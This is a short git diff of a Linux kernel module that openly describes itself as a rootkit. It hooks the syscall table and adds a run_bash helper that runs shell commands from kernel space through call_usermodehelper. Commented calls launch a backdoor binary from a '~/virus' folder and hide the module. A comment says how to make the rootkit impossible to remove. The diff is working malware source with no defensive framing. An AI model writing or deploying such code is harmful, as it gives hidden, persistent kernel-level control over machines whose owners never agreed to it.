@@ -22,12 +22,9 @@ static int __init lkm_example_init(void) {
     //re-place syscalls with our own
     update_sys_calls(sys_call_table);
 
-    //create backdoor connection
-        //launch backdoor
-
-    //Hide rootkit and launch virus stuff (UNCOMMENT FOR AUTOMATION OF THIS)
+    //launch backdoor
+    //run_bash("~/virus/backdoor")
     //hide();
-    //launch virus
 
     return 0;
 }
@@ -37,8 +34,28 @@ static void __exit lkm_example_exit(void) {
     revert_to_original(sys_call_table);
 }
 
+// runs a bash command
+int run_bash(char* command) {
+    int res;
+    char* argv[4];
+    char* envp[4];
+
+    argv[0] = "bin/bash";
+    argv[1] = "-c";
+    argv[2] = command;
+    argv[3] = NULL;
+
+    envp[0] = "HOME=/";
+    envp[1] = "TERM=linux";
+    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
+    envp[3] = NULL;
+
+    res = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    return res;
+}
+
 
 
 module_init(lkm_example_init);
-//TODO Comment this line out to make it so the rootkit can't be removed
+//Comment this line out to make it so the rootkit can't be removed
 module_exit(lkm_example_exit);
